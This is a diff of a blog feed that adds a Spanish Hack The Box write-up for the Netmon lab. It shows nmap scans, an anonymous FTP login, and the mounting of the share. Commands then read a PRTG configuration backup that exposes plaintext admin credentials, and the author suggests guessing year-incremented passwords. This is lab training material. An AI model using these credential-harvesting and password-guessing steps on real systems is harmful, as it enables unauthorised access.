@@ -1,4 +1,356 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-02-06T18:03:38-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Sense</title><link href="http://localhost:4000/htb-sense/" rel="alternate" type="text/html" title="Hack The Box Sense" /><published>2022-02-06T00:00:00-06:00</published><updated>2022-02-06T00:00:00-06:00</updated><id>http://localhost:4000/htb-sense</id><content type="html" xml:base="http://localhost:4000/htb-sense/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-sense/banner-sense.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-02-06T21:18:51-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Netmon</title><link href="http://localhost:4000/htb-netmon/" rel="alternate" type="text/html" title="Hack The Box Netmon" /><published>2022-02-06T00:00:00-06:00</published><updated>2022-02-06T00:00:00-06:00</updated><id>http://localhost:4000/htb-netmon</id><content type="html" xml:base="http://localhost:4000/htb-netmon/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-netmon/banner-netmon.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;netmon&quot;&gt;Netmon&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.152.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.152
+PING 10.10.10.152 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.152&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.152: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;137 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.152 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 136.924/136.924/136.924/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.152 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-06 18:09 CST
+Initiating SYN Stealth Scan at 18:09
+Scanning 10.10.10.152 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 139/tcp on 10.10.10.152
+Discovered open port 445/tcp on 10.10.10.152
+Discovered open port 135/tcp on 10.10.10.152
+Discovered open port 21/tcp on 10.10.10.152
+Discovered open port 80/tcp on 10.10.10.152
+Discovered open port 49669/tcp on 10.10.10.152
+Discovered open port 5985/tcp on 10.10.10.152
+Discovered open port 49667/tcp on 10.10.10.152
+Discovered open port 49664/tcp on 10.10.10.152
+Discovered open port 49666/tcp on 10.10.10.152
+Discovered open port 49665/tcp on 10.10.10.152
+Discovered open port 49668/tcp on 10.10.10.152
+Discovered open port 47001/tcp on 10.10.10.152
+Completed SYN Stealth Scan at 18:10, 16.59s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.152
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Scanned at 2022-02-06 18:09:48 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;17s
+Not shown: 65197 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 325 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT      STATE SERVICE      REASON
+21/tcp    open  ftp          syn-ack ttl 127
+80/tcp    open  http         syn-ack ttl 127
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+5985/tcp  open  wsman        syn-ack ttl 127
+47001/tcp open  winrm        syn-ack ttl 127
+49664/tcp open  unknown      syn-ack ttl 127
+49665/tcp open  unknown      syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49668/tcp open  unknown      syn-ack ttl 127
+49669/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;16.70 seconds
+           Raw packets sent: 81004 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.564MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 67859 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.714MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.152
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-06 18:10 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.152                
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                     
+                                                                
+PORT      STATE SERVICE      VERSION          
+21/tcp    open  ftp          Microsoft ftpd     
+| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| 02-02-19  11:18PM                 1024 .rnd
+| 02-25-19  09:15PM       &amp;lt;DIR&amp;gt;          inetpub                                                                                 
+| 07-16-16  08:18AM       &amp;lt;DIR&amp;gt;          PerfLogs    
+| 02-25-19  09:56PM       &amp;lt;DIR&amp;gt;          Program Files
+| 02-02-19  11:28PM       &amp;lt;DIR&amp;gt;          Program Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| 02-03-19  07:08AM       &amp;lt;DIR&amp;gt;          Users            
+|_02-25-19  10:49PM       &amp;lt;DIR&amp;gt;          Windows  
+| ftp-syst:                                                     
+|_  SYST: Windows_NT                                                                                                             
+80/tcp    open  http         Indy httpd 18.1.37.13946 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Paessler PRTG bandwidth monitor&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| http-title: Welcome | PRTG Network Monitor &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NETMON&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_Requested resource was /index.htm        
+|_http-server-header: PRTG/18.1.37.13946                                                                                         
+|_http-trane-info: Problem with XML parsing of /evox/about
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Not Found                                         
+|_http-server-header: Microsoft-HTTPAPI/2.0       
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Not Found                                                                                                          
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2022-02-07T00:11:39
+|_  start_date: 2022-02-07T00:08:23
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;66.54 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos el puerto 21 abierto, así que vamos a tratar de ingresar como el usuario &lt;strong&gt;anonymous&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ftp 10.10.10.152
+Connected to 10.10.10.152.
+220 Microsoft FTP Service
+Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.152:k4miyo&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
+331 Anonymous access allowed, send identity &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e-mail name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; as password.
+Password:
+230 User logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is Windows_NT.
+ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
+&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
+02-02-19  11:18PM                 1024 .rnd
+02-25-19  09:15PM       &amp;lt;DIR&amp;gt;          inetpub
+07-16-16  08:18AM       &amp;lt;DIR&amp;gt;          PerfLogs
+02-25-19  09:56PM       &amp;lt;DIR&amp;gt;          Program Files
+02-02-19  11:28PM       &amp;lt;DIR&amp;gt;          Program Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+02-03-19  07:08AM       &amp;lt;DIR&amp;gt;          Users
+02-25-19  10:49PM       &amp;lt;DIR&amp;gt;          Windows
+226 Transfer complete.
+ftp&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos acceso y vemos una estructura de lo que encontraría con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\&lt;/code&gt;, com son varios recursos, vamos hacer uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curlftpfs&lt;/code&gt; para crearnos una montura.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /mnt/ftp
+❯ curlftpfs anonymous:loquesea@10.10.10.152 /mnt/ftp/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora ya podemos ingresar más cómodos a la montura y visualizar los recursos de la máquina víctima. Pero para no buscar recursos en todos lados; vemos que también se encuentra abierto el puerto 80, así que antes de ver el contenido vía web, ocuparemos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.152/
+http://10.10.10.152/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;302 Found] Country[RESERVED][ZZ], HTTPServer[PRTG/18.1.37.13946], IP[10.10.10.152], PRTG-Network-Monitor[18.1.37.13946,PRTG], RedirectLocation[/index.htm], UncommonHeaders[x-content-type-options], X-XSS-Protection[1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;block]
+ERROR Opening: http://10.10.10.152/index.htm - incorrect header check
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No tenemos nada interesante, así que ahora si visualizamos el contenido vía web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-netmon/netmon-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos enfrentamos antes un &lt;strong&gt;PRTG Network Monitor&lt;/strong&gt; e igual dicha tecnología presenta credenciales default, que buscando un poco las credenciales son &lt;strong&gt;prtgadmin : prtgadmin&lt;/strong&gt;; sin embargo, vemos que no podemos ingresar. Pensando un poco como atacantes, podríamos deducir que existe un posible archivos de configuración en donde se guarden credenciales en texto claro y tenemos una vía de acceso de esos recursos por FTP.&lt;/p&gt;
+
+&lt;p&gt;Investigando un poco, encontramos el recurso &lt;a href=&quot;https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data&quot;&gt;paessler.com&lt;/a&gt; y vemos que la posibles rutas donde se encuentra instalado el software de &lt;strong&gt;PRTG Network Monitor&lt;/strong&gt; serian:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;%programfiles%\PRTG Network Monitor&lt;/li&gt;
+  &lt;li&gt;%programfiles(x86)%\PRTG Network Monitor&lt;/li&gt;
+  &lt;li&gt;%programdata%\Paessler\PRTG Network Monitor&lt;/li&gt;
+  &lt;li&gt;%ALLUSERSPROFILE%\Application data\Paessler\PRTG Network Monitor&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Vamos a validarlas en la montura que tenemos:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /mnt/ftp
+❯ ll
+d--------- root root   0 B  Sun Nov 20 21:46:00 2016  &lt;span class=&quot;nv&quot;&gt;$RECYCLE&lt;/span&gt;.BIN
+d--------- root root   0 B  Sun Feb  3 07:05:00 2019  Documents and Settings
+d--------- root root   0 B  Mon Feb 25 21:15:00 2019  inetpub
+d--------- root root   0 B  Sat Jul 16 09:18:00 2016  PerfLogs
+d--------- root root   0 B  Mon Feb 25 21:56:00 2019  Program Files
+d--------- root root   0 B  Sat Feb  2 23:28:00 2019  Program Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+d--------- root root   0 B  Wed Dec 15 09:40:00 2021  ProgramData
+d--------- root root   0 B  Sun Feb  3 07:05:00 2019  Recovery
+d--------- root root   0 B  Sun Feb  3 07:04:00 2019  System Volume Information
+d--------- root root   0 B  Sun Feb  3 07:08:00 2019  Users
+d--------- root root   0 B  Mon Feb 25 22:49:00 2019  Windows
+.--------- root root 380 KB Sun Nov 20 20:59:00 2016  bootmgr
+.--------- root root   1 B  Sat Jul 16 09:10:00 2016  BOOTNXT
+.--------- root root 704 MB Sun Feb  6 19:08:00 2022  pagefile.sys
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos la carpeta &lt;strong&gt;ProgramData&lt;/strong&gt; que corresponde al tercer punto de las posibles rutas donde se encuentra instalado el programa; así que vamos por ahí.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;ProgramData
+❯ ll
+d--------- root root 0 B Sun Feb  3 07:05:00 2019  Application Data
+d--------- root root 0 B Wed Dec 15 09:40:00 2021  Corefig
+d--------- root root 0 B Sun Feb  3 07:05:00 2019  Desktop
+d--------- root root 0 B Sun Feb  3 07:05:00 2019  Documents
+d--------- root root 0 B Sat Feb  2 23:15:00 2019  Licenses
+d--------- root root 0 B Sun Nov 20 21:36:00 2016  Microsoft
+d--------- root root 0 B Sat Feb  2 23:18:00 2019  Paessler
+d--------- root root 0 B Sun Feb  3 07:05:00 2019  regid.1991-06.com.microsoft
+d--------- root root 0 B Sat Jul 16 09:18:00 2016  SoftwareDistribution
+d--------- root root 0 B Sun Feb  3 07:05:00 2019  Start Menu
+d--------- root root 0 B Sat Feb  2 23:15:00 2019  TEMP
+d--------- root root 0 B Sun Feb  3 07:05:00 2019  Templates
+d--------- root root 0 B Sun Nov 20 21:19:00 2016  USOPrivate
+d--------- root root 0 B Sun Nov 20 21:19:00 2016  USOShared
+d--------- root root 0 B Mon Feb 25 21:56:00 2019  VMware
+❯ &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Paessler
+❯ ll
+d--------- root root 0 B Sun Feb  6 19:09:00 2022  PRTG Network Monitor
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vamos a ver que archivos se encuentran en &lt;strong&gt;PRTG Network Monitor&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PRTG Network Monitor&quot;&lt;/span&gt;
+❯ ll
+d--------- root root   0 B  Wed Dec 15 07:23:00 2021  Configuration Auto-Backups
+d--------- root root   0 B  Sun Feb  6 19:09:00 2022  Log Database
+d--------- root root   0 B  Sat Feb  2 23:18:00 2019  Logs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debug&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+d--------- root root   0 B  Sat Feb  2 23:18:00 2019  Logs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Sensors&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+d--------- root root   0 B  Sat Feb  2 23:18:00 2019  Logs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;System&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+d--------- root root   0 B  Sun Feb  6 19:09:00 2022  Logs &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Web Server&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+d--------- root root   0 B  Wed Dec 15 07:19:00 2021  Monitoring Database
+d--------- root root   0 B  Mon Feb 25 22:00:00 2019  Report PDFs
+d--------- root root   0 B  Sat Feb  2 23:18:00 2019  System Information Database
+d--------- root root   0 B  Sat Feb  2 23:40:00 2019  Ticket Database
+d--------- root root   0 B  Sat Feb  2 23:18:00 2019  ToDo Database
+.--------- root root 1.1 MB Mon Feb 25 21:54:00 2019  PRTG Configuration.dat
+.--------- root root 1.1 MB Mon Feb 25 21:54:00 2019  PRTG Configuration.old
+.--------- root root 1.1 MB Sat Jul 14 03:13:00 2018  PRTG Configuration.old.bak
+.--------- root root 1.6 MB Sun Feb  6 19:09:00 2022  PRTG Graph Data Cache.dat
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Encontramos unos archivos de configuración &lt;strong&gt;PRTG Configuration&lt;/strong&gt;, los cuales podrían contener configuración de la tecnología, como su nombre lo indica, y tal vez encontraríamos credenciales de acceso.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ file PRTG&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+PRTG Configuration.dat:     XML 1.0 document, UTF-8 Unicode &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;with BOM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; text, with very long lines, with CRLF line terminators
+PRTG Configuration.old:     XML 1.0 document, UTF-8 Unicode &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;with BOM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; text, with very long lines, with CRLF line terminators
+PRTG Configuration.old.bak: XML 1.0 document, UTF-8 Unicode &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;with BOM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; text, with very long lines, with CRLF line terminators
+PRTG Graph Data Cache.dat:  data
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Uno que ya nos debería llamar un poco la atención sería el que termina en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bak&lt;/code&gt; ya que hace referencia a un backup y si revisamos su contenido, encontramos lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PRTG Configuration.old.bak&quot;&lt;/span&gt; | less &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt;
+...
+&amp;lt;dbpassword&amp;gt;
+&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; User: prtgadmin &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+PrTg@dmin2018
+&amp;lt;/dbpassword&amp;gt;
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos las credenciales &lt;strong&gt;prtgadmin : PrTg@dmin2018&lt;/strong&gt;; podríamos tratar de probarlas en el panel de login, pero vemos que no podemos acceder. Pensando un poco, dichas credenciales las obtuvimos del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PRTG Configuration.old.bak&lt;/code&gt;, lo que nos hace referencia que son antiguas y ¿si la contraseña sigue el mismo principio cambiando el año? Podríamos tratar de ingresar &lt;strong&gt;PrTg@dmin2019&lt;/strong&gt;, &lt;strong&gt;PrTg@dmin2020&lt;/strong&gt;, y así sucesivamente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-netmon/netmon-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
